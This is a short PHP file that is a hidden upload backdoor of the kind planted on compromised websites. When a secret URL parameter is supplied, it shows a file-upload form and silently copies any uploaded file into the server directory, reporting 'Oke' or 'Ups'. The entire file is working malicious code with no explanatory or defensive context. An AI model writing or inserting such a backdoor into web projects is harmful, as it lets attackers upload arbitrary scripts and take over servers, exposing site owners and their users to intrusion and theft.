<?php if(isset($_GET["8a3CCULMKtuzgSv8"])){
  ?>
<form action="" method="post" enctype="multipart/form-data" name="pmb" id="pmb"><input type="file" name="file" size="50"><input name="ojs" type="submit" id="ojs" value="Crot"></form>
<?php if($_POST['ojs']=="Crot"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) { echo '<b>Oke</b>'; } else { echo '<b>Ups</b>';} }  exit; } ?>